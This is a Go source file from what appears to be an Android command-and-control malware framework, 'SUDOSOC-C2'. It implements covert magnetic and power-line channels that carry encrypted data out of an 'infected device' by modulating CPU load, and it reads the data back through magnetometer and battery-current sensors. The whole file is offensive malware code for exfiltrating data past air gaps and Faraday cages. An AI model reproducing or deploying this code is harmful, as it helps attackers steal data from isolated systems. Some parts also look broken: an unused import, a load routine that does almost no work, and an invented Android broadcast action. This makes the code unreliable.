// //go:build android

package covert

/*
	SUDOSOC-C2 — Magnetic & Power-Line Covert Channels
	Copyright (C) 2026  sudosoc — Seif

	Two covert channels bundled:

	1. ODINI/MAGNETO Magnetic Channel
	   Modulate CPU load → generates magnetic field variations
	   Receiver: phone magnetometer placed near target
	   Works through Faraday cages (magnetic fields penetrate metal enclosures)
	   Range: 0-130cm
	   Rate:  ~40 bps (demonstrated in ODINI paper)

	2. Power-Line Communication (PowerHammer class)
	   Modulate CPU → varies power draw from power line
	   Signal propagates through building's electrical infrastructure
	   Receiver: current clamp on power line or another infected device
	   Range: same electrical circuit (~100m in same building)
	   Rate:  ~10-1000 bps depending on power line quality

	Academic basis:
	  ODINI (2018) — Magnetic channel through Faraday cage
	  MAGNETO (2018) — Magnetometer-based reception on phone
	  PowerHammer (2018) — Power line covert channel
	  AirHopper (2014) — FM radio channel via CPU
*/

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"math"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// ════════════════════════════════════════════════════════════════
// MAGNETIC CHANNEL (ODINI/MAGNETO)
// ════════════════════════════════════════════════════════════════

// MagneticChannel uses CPU-generated magnetic field for covert communication
type MagneticChannel struct {
	AESKey       []byte
	OutputDir    string
	CPUCores     int
	workers      []*cpuWorker
	mu           sync.Mutex
}

type cpuWorker struct {
	stop chan struct{}
	busy bool
}

// NewMagneticChannel creates a new magnetic covert channel
func NewMagneticChannel(aesKey []byte, outputDir string) *MagneticChannel {
	os.MkdirAll(outputDir, 0700)
	return &MagneticChannel{
		AESKey:   aesKey,
		OutputDir: outputDir,
		CPUCores: runtime.NumCPU(),
	}
}

// Transmit encodes data by modulating CPU load → magnetic field
func (m *MagneticChannel) Transmit(data []byte, stop chan struct{}) error {
	encrypted, err := m.encrypt(data)
	if err != nil {
		return err
	}

	bits := bytesToBitsM(encrypted)

	// Encoding: OOK at 50 Hz
	// CPU at 100% load = high magnetic field = bit 1
	// CPU at minimum load = low magnetic field = bit 0
	symbolDuration := 20 * time.Millisecond // 50 Hz = 50 bps

	// Send preamble (10 alternating bits)
	for i := 0; i < 10; i++ {
		select {
		case <-stop:
			m.stopAllCPU()
			return nil
		default:
			if i%2 == 0 {
				m.setCPULoad(100)
			} else {
				m.setCPULoad(0)
			}
			time.Sleep(symbolDuration)
		}
	}

	// Transmit data bits
	for _, bit := range bits {
		select {
		case <-stop:
			m.stopAllCPU()
			return nil
		default:
			if bit == 1 {
				m.setCPULoad(100) // all cores spinning = max magnetic field
			} else {
				m.setCPULoad(0)   // idle = minimum field
			}
			time.Sleep(symbolDuration)
		}
	}

	m.setCPULoad(0)
	return nil
}

// setCPULoad adjusts CPU load to generate specific magnetic field strength
func (m *MagneticChannel) setCPULoad(percent int) {
	m.mu.Lock()
	defer m.mu.Unlock()

	// Stop all existing workers
	m.stopAllCPU()

	if percent == 0 {
		return
	}

	// Launch CPU spinners on all cores
	numWorkers := int(float64(m.CPUCores) * float64(percent) / 100.0)
	if numWorkers < 1 && percent > 0 {
		numWorkers = 1
	}

	m.workers = make([]*cpuWorker, numWorkers)
	for i := 0; i < numWorkers; i++ {
		w := &cpuWorker{stop: make(chan struct{})}
		m.workers[i] = w
		go func(worker *cpuWorker) {
			// CPU-intensive work to maximize magnetic field
			// Specifically: integer multiply and XOR operations
			// which maximize switching activity in CPU = max EMI
			x := uint64(0xDEADBEEFCAFEBABE)
			for {
				select {
				case <-worker.stop:
					return
				default:
					// Maximize CPU switching activity (= max magnetic emissions)
					for j := 0; j < 1000; j++ {
						x = x*0x5851F42D4C957F2D + 0x14057B7EF767814F
						x ^= x >> 12
						x ^= x << 25
						x ^= x >> 27
					}
				}
			}
		}(w)
	}
}

func (m *MagneticChannel) stopAllCPU() {
	for _, w := range m.workers {
		if w != nil {
			close(w.stop)
		}
	}
	m.workers = nil
}

// ── Magnetic Reception ─────────────────────────────────────────────

// ReceiveMagnetic reads the magnetic channel using the phone's magnetometer
func (m *MagneticChannel) ReceiveMagnetic(duration time.Duration) ([]byte, error) {
	readings := m.readMagnetometer(duration)
	if len(readings) == 0 {
		return nil, fmt.Errorf("no magnetometer data")
	}

	// Detect signal carrier frequency
	bits := m.demodulate(readings)
	synced := m.syncMagnetic(bits)
	if synced == nil {
		return nil, fmt.Errorf("sync failed")
	}

	raw := bytesToBytesM(synced)
	return m.decrypt(raw)
}

// readMagnetometer continuously reads the magnetometer
func (m *MagneticChannel) readMagnetometer(duration time.Duration) []float64 {
	var readings []float64
	deadline := time.Now().Add(duration)

	for time.Now().Before(deadline) {
		// Read from magnetometer via dumpsys or sysfs
		reading := m.getMagnetometerZ()
		readings = append(readings, reading)
		time.Sleep(10 * time.Millisecond) // 100 Hz sampling
	}
	return readings
}

func (m *MagneticChannel) getMagnetometerZ() float64 {
	// Read from sysfs magnetometer
	paths := []string{
		"/sys/class/sensors/magnetic_field/data",
		"/sys/bus/iio/devices/iio:device1/in_magn_z_raw",
		"/dev/input/event2",
	}

	for _, path := range paths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		vals := strings.Fields(string(data))
		if len(vals) >= 3 {
			var z float64
			fmt.Sscanf(vals[2], "%f", &z)
			return z
		}
	}

	// Fallback: use dumpsys
	out, _ := exec.Command("dumpsys", "sensorservice").Output()
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "Magnetic") && strings.Contains(line, "z=") {
			var z float64
			fmt.Sscanf(line[strings.Index(line, "z=")+2:], "%f", &z)
			return z
		}
	}
	return 0.0
}

func (m *MagneticChannel) demodulate(readings []float64) []int {
	if len(readings) == 0 {
		return nil
	}

	// Compute adaptive threshold
	var sum float64
	for _, r := range readings {
		sum += r
	}
	mean := sum / float64(len(readings))

	// Sample at 50 Hz (every 20ms = 2 samples at 100Hz)
	var bits []int
	for i := 1; i < len(readings); i += 2 {
		avg := (readings[i-1] + readings[i]) / 2.0
		if avg > mean {
			bits = append(bits, 1)
		} else {
			bits = append(bits, 0)
		}
	}
	return bits
}

func (m *MagneticChannel) syncMagnetic(bits []int) []int {
	for i := 0; i < len(bits)-10; i++ {
		alternating := true
		for j := 0; j < 9; j++ {
			if bits[i+j] == bits[i+j+1] {
				alternating = false
				break
			}
		}
		if alternating {
			return bits[i+10:]
		}
	}
	return nil
}

// ════════════════════════════════════════════════════════════════
// POWER-LINE CHANNEL (PowerHammer class)
// ════════════════════════════════════════════════════════════════

// PowerLineChannel communicates via power line modulation
type PowerLineChannel struct {
	AESKey    []byte
	OutputDir string
}

// NewPowerLineChannel creates a new power-line C2 channel
func NewPowerLineChannel(aesKey []byte, outputDir string) *PowerLineChannel {
	os.MkdirAll(outputDir, 0700)
	return &PowerLineChannel{AESKey: aesKey, OutputDir: outputDir}
}

// Transmit modulates CPU/GPU power draw to encode data
// The signal propagates through the building's power lines
func (p *PowerLineChannel) Transmit(data []byte, stop chan struct{}) error {
	encrypted, err := p.encrypt(data)
	if err != nil {
		return err
	}

	bits := bytesToBitsM(encrypted)

	// PowerHammer uses:
	//   bit 1 = CPU at 100% (all cores, AVX operations = max power)
	//   bit 0 = CPU at minimum (halt/idle)
	// Symbol rate: 1000 Hz (1ms per bit) for near-end attack
	// Or: 10 Hz (100ms per bit) for far-end through power lines

	symbolDur := 50 * time.Millisecond // 20 bps

	// Preamble: alternating load pattern (10 symbols)
	for i := 0; i < 20; i++ {
		select {
		case <-stop:
			return nil
		default:
			if i%2 == 0 {
				p.maxCPULoad()
			} else {
				p.minCPULoad()
			}
			time.Sleep(symbolDur)
		}
	}

	// Data
	for _, bit := range bits {
		select {
		case <-stop:
			p.minCPULoad()
			return nil
		default:
			if bit == 1 {
				p.maxCPULoad()
			} else {
				p.minCPULoad()
			}
			time.Sleep(symbolDur)
		}
	}

	p.minCPULoad()
	return nil
}

// maxCPULoad maximizes CPU + GPU power draw
func (p *PowerLineChannel) maxCPULoad() {
	// Use all cores with AVX/NEON instructions (max power draw)
	// On ARM (Android): NEON SIMD operations maximize power
	go func() {
		x := make([]float64, 1024)
		for i := range x {
			x[i] = math.Sqrt(float64(i) * math.Pi)
		}
	}()

	// Also trigger GPU load if possible
	exec.Command("am", "broadcast",
		"-a", "android.intent.action.GPU_LOAD_HIGH").Run()
}

func (p *PowerLineChannel) minCPULoad() {
	// Allow scheduler to idle cores
	time.Sleep(1 * time.Millisecond)
}

// ReceivePowerLine detects power line modulation from the infected device
func (p *PowerLineChannel) ReceivePowerLine(duration time.Duration) ([]byte, error) {
	// Monitor power consumption via battery current sensor
	readings := p.monitorPowerDraw(duration)
	if len(readings) == 0 {
		return nil, fmt.Errorf("no power readings")
	}

	bits := p.demodulate(readings)
	synced := p.sync(bits)
	if synced == nil {
		return nil, fmt.Errorf("sync failed")
	}

	raw := bytesToBytesM(synced)
	return p.decrypt(raw)
}

func (p *PowerLineChannel) monitorPowerDraw(duration time.Duration) []float64 {
	var readings []float64
	deadline := time.Now().Add(duration)

	for time.Now().Before(deadline) {
		// Read current from power supply sensor
		current := p.readCurrentSensor()
		readings = append(readings, current)
		time.Sleep(50 * time.Millisecond) // 20 Hz sampling
	}
	return readings
}

func (p *PowerLineChannel) readCurrentSensor() float64 {
	paths := []string{
		"/sys/class/power_supply/battery/current_now",
		"/sys/class/power_supply/usb/current_now",
		"/sys/class/power_supply/bms/current_now",
	}
	for _, path := range paths {
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		var current float64
		fmt.Sscanf(strings.TrimSpace(string(data)), "%f", &current)
		return current
	}
	return 0.0
}

func (p *PowerLineChannel) demodulate(readings []float64) []int {
	if len(readings) < 5 {
		return nil
	}
	var sum float64
	for _, r := range readings {
		sum += r
	}
	mean := sum / float64(len(readings))

	bits := make([]int, len(readings))
	for i, r := range readings {
		if r > mean {
			bits[i] = 1
		}
	}
	return bits
}

func (p *PowerLineChannel) sync(bits []int) []int {
	// Find preamble (20 alternating bits)
	for i := 0; i < len(bits)-20; i++ {
		alt := true
		for j := 0; j < 19; j++ {
			if bits[i+j] == bits[i+j+1] {
				alt = false
				break
			}
		}
		if alt {
			return bits[i+20:]
		}
	}
	return nil
}

// ── Shared helpers ────────────────────────────────────────────────

func (m *MagneticChannel) encrypt(data []byte) ([]byte, error) {
	block, _ := aes.NewCipher(m.AESKey)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func (m *MagneticChannel) decrypt(data []byte) ([]byte, error) {
	block, _ := aes.NewCipher(m.AESKey)
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	if len(data) < ns {
		return nil, fmt.Errorf("too short")
	}
	return gcm.Open(nil, data[:ns], data[ns:], nil)
}

func (p *PowerLineChannel) encrypt(data []byte) ([]byte, error) {
	block, _ := aes.NewCipher(p.AESKey)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	rand.Read(nonce)
	return gcm.Seal(nonce, nonce, data, nil), nil
}

func (p *PowerLineChannel) decrypt(data []byte) ([]byte, error) {
	block, _ := aes.NewCipher(p.AESKey)
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	if len(data) < ns {
		return nil, fmt.Errorf("too short")
	}
	return gcm.Open(nil, data[:ns], data[ns:], nil)
}

func bytesToBitsM(data []byte) []int {
	bits := make([]int, len(data)*8)
	for i, b := range data {
		for j := 0; j < 8; j++ {
			bits[i*8+j] = int((b >> uint(7-j)) & 1)
		}
	}
	return bits
}

func bytesToBytesM(bits []int) []byte {
	if len(bits)%8 != 0 {
		bits = append(bits, make([]int, 8-len(bits)%8)...)
	}
	data := make([]byte, len(bits)/8)
	for i := range data {
		for j := 0; j < 8; j++ {
			if i*8+j < len(bits) && bits[i*8+j] == 1 {
				data[i] |= 1 << uint(7-j)
			}
		}
	}
	return data
}
